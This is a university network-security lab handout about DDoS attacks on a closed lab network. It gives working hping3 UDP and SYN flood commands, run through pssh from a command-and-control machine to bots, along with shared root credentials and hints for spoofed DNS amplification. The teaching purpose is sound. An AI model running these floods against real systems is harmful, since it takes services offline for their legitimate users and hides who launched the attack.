---
description: Flood Attack With Hping3 and TCP SYN Flooding
---

# DDoS Lab

## Lab Network:

You can access most machines( with IP label on monitor ) in security lab with your credentials.\
192.168.10.8\~192.168.10.24 are available to use.\
192.168.10.9 can be used as sniffer machine.

### Bot:&#x20;

machine to launch attacks.&#x20;

You are not going to log into these bots.&#x20;

IP: Bot1: 192.168.10.109 \
Hosted on machine:192.168.10.21 \
\
Bot2: 192.168.10.132 \
Hosted on machine:192.168.10.20&#x20;

Bot3: 192.168.10.107

Bot4: 192.168.10.150\
\
Credentials: root/private123

### SSH:

to get into a machine:

use: ssh username@machine-ip     to get into that machine.

it will prompt the fingerprint of the target machine and type in yes to continue.

and then it will prompt to enter password credentials.

here the cnc and bot machines username are 'root' and pass are 'private123'



### CnC:&#x20;

command and control machine used to observe and connect to Bots.&#x20;

IP: 192.168.10.111 Credentials: root/private123

### Victim machine:&#x20;

target of the DDoS attacks.&#x20;

IP: 192.168.10.112 Hosted on machine 192.168.10.22\
Port 80 open.

### DNS server:

used in DNS Amplification attack

IP: 192.168.10.135\


## 1. Performance Evaluation

Victim response time observing: \
In CnC machine, goto DDoS\_Lab4 folder and run:&#x20;

```
#./ping_web.sh 192.168.10.112
```

(192.168.10.112 - victim machine with port 80 open)\
Then the terminal will continuously check the response time of the victim machine.



## 2. Flood Attack

In the CnC machine, go to DDoS\_Lab4 folder and execute the following commands:&#x20;

PSSH: [https://linux.die.net/man/1/pssh](https://linux.die.net/man/1/pssh)

Show avaiable bots:

```bash
#pssh -h bots.txt -P -t100 'hostname'
```

Then launch the attack using:

{% code overflow="wrap" %}
```bash
#pssh -h bots.txt -P -t30 'sleep 1; hping3 --udp -d 10000 -p 80 --flood 192.168.10.112 & sleep 10; pkill hping3'
```
{% endcode %}

Arguments:

* sleep: Delay for a specified amount of time&#x20;
* hping3: Send (almost) arbitrary TCP/IP packets to network hosts&#x20;
* \--udp: UDP mode
* \-d data size: set packet body size&#x20;
* \-p: set destination port&#x20;
* \--flood: send packets as fast as possible without taking care to show incoming replies.
* &: executes the commands in the background.
* pkill: look up or signal processes based on name and other attributes.

&#x20;If the script does not stop after 30 seconds, use Ctrl+C to stop.



## 3. TCP Syn Flood

In the CnC machine, ssh into one of the bots available:&#x20;

```bash
#ssh 192.168.10.109
```

Then in the bot shell, where “root@bot\~#” shows, run&#x20;

{% code overflow="wrap" %}
```bash
#hping3 -V -c 10 -d 120 -S -w 64 -p 80 -i u10000 --rand-source 192.168.10.112
```
{% endcode %}

Arguments:

* \-V :enable verbose output
* \-c count: stop after sending(and receiving) count response packets
* \-d data size: set packet body size
* \-S: set SYN tcp flag
* \-w: set TCP window size. Default is 64.
* \-p: set destination port
* \-i: wait the specified number of seconds or microseconds between sending each packet.
* \--rand-source: this option enables the random source mode. Hping will send packets with random source addresses.

If the above command doesn’t get the expected result, change count to a bigger one.



## Appendix

Appendix:

### BOT NET&#x20;

In this lab, a botnet is constructed by a set of Kali linux VMs deployed on every host machine on the Clemson network. Each Kali VM is configured with SSH passwordless login. The CnC server is also a Kali Linux VM. The CnC server has the public key used to login to each bot. The program pssh installed on the CnC server, or parallel ssh, is used to remotely execute ssh commands on each bot in parallel. By using the CnC server, all attack traffic is launched from the bot. The victim will not be aware the true identity of the CnC server.

You can also write your own attack script, upload to the bots, and use pssh or any method to launch your attack script. pssh(1 - Linux man page https://linux.die.net/man/1/pssh

### Flood Attack&#x20;

Flood attack consumes network bandwidth by sending a large number of packets and usually from multiple bots. A flood attack does not necessarily have to be launched directly against the target. As long as one node on the route between a legitimate user and the victim is congested, the legitimate user will not be able to visit the victim node. Under such scenarios, the victim will not observe any attack traffic, but the service to the legitimate user is denied. For the configuration we have in the lab, a direct flood attack is much more effective than trying to starve the internal bandwidth of the switch. Hping3 - Linux man page https://linux.die.net/man/8/hping3

### SYN Flood&#x20;

SYN flood attack takes advantage of the three-way handshake of the TCP connection by sending a large amount of SYN packets but never actually establishing any connections. SYN cookie is one of the most commonly used methods to mitigate such attacks. However, it is still debating whether it is good to use SYN cookie on heavy loaded servers. Defenses Against TCP SYN Flooding Attacks :&#x20;

{% embed url="https://www.cisco.com/c/dam/en_us/about/ac123/ac147/archived_issues/ipj_9-4/ipj_9-4.pdf" %}

### Slow HTTP&#x20;

The slow HTTP attack sonsumes victim webpage server by slowly sending HTTP requests. The HTTP server keeps the connection until all the webserver’s resources are consumed. That is why the slowloris attack does not affect at the very beginning but slowly makes the web server stop responding. Slowloris HTTP DoS&#x20;

{% embed url="https://web.archive.org/web/20090822001255/http://ha.ckers.org/slowloris/" %}

### DNS Amplification Attack&#x20;

There are many DNS amplification attack tools available on Github. Many of them are written in python with scapy library. However, scapy is naturally very very slow. Using scapy to perform DNS amplification attacks might work when you have multiple bots and more DNS servers. As a hint, hping3 is not capable of crafting a DNS request packet, but it can be used to replay a crafted DNS payload. You can simply use dig to generate a legitimate DNS packet first, store the DNS payload only, and then send the DNS payload with a spoofed source. By using hping3, you will see the limit of a DNS server, and why the victim is not disconnected during an attack. Honeypot Based monitoring of Amplification DDoS attacks.&#x20;

{% embed url="https://labs.ripe.net/Members/johannes_krupp/honeypot-based-monitoring-of-amplification-ddos-attacks" %}
